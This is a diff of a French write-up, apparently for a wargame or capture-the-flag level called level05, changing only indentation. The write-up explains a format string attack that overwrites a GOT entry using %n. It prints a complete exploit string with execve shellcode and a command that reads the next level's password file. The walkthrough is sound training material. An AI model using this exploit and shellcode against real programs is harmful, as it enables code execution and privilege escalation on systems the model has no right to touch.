@@ -21,10 +21,10 @@ trouver la difference entre les addresses gdb et celles de l'execution. On passe
 des %p au printf pour lui faire afficher la memoire, et on cherche des addresses
 stack a comparer entre gdb et l'execution normale.
 
-$ echo "%p %p %p %p %p %p %p %p %p %p" > /tmp/in
-$ cat /tmp/in | ./level05
-$ gdb level05
-(gdb) r < /tmp/in
+	$ echo "%p %p %p %p %p %p %p %p %p %p" > /tmp/in
+	$ cat /tmp/in | ./level05
+	$ gdb level05
+	(gdb) r < /tmp/in
 
 En comparant les addresses on trouve que la difference entre les addresses gdb
 et exec normale est de 32 octets de plus pour l'execution normale. On trouve
@@ -37,10 +37,10 @@ Notre chaine de format string attack seras donc:
 [addresse GOT][addresse GOT + 4][nombre des 2 1ers octets addr shellcode]%10$n↙
 [nombre des 2 derniers octets addr shellcode - octets deja affiches]%11$n
 
--les addresses font 4 octets chacunes (8 octets),
--le padding se fait avec "%12345x" les 2 fois, soit 2*7 octets (14 octets)
--les %n sont "%10$n" et "%11$n" soit 2*5 octets (10 octets)
--l'octet nul pour separer le shellcode de la chaine d'attaque ajoute 1 octet
+- les addresses font 4 octets chacunes (8 octets),
+- le padding se fait avec "%12345x" les 2 fois, soit 2*7 octets (14 octets)
+- les %n sont "%10$n" et "%11$n" soit 2*5 octets (10 octets)
+- l'octet nul pour separer le shellcode de la chaine d'attaque ajoute 1 octet
 
 Notre chaine d'attaque fait donc au total 33 octets. On ajoute 33 a l'addresse
 du buffer en execution normale pour obtenir l'addresse de notre shellcode en
@@ -53,9 +53,9 @@ ecrire en memoire precisement 0xffffd6d9:
 -2eme moitie: On enleve le nombre d'octets deja affiches (0xd6d9)
 0xffff - 0xd6d9 = 10534 en decimal
 
-Notre chaine d'attaque complete seras donc:
+Notre chaine d'attaque complete seras donc:  
 [chaine pour la GOT override (ligne 37-38)][octet 0][shellcode][padding pour satisfaire le fgets]
 
-$ [copie colle du contenu de fill_script_command]
-$ echo -en "\xe0\x97\x04\x08\xe2\x97\x04\x08%54993x%10\$n%10534x%11\$n\x00\x31\xc0\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80"$(/tmp/fill 50) > /tmp/in
-$ (cat /tmp/in; echo "cat /home/users/level06/.pass") | ./level05
+	$ [copie colle du contenu de fill_script_command]
+	$ echo -en "\xe0\x97\x04\x08\xe2\x97\x04\x08%54993x%10\$n%10534x%11\$n\x00\x31\xc0\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80"$(/tmp/fill 50) > /tmp/in
+	$ (cat /tmp/in; echo "cat /home/users/level06/.pass") | ./level05
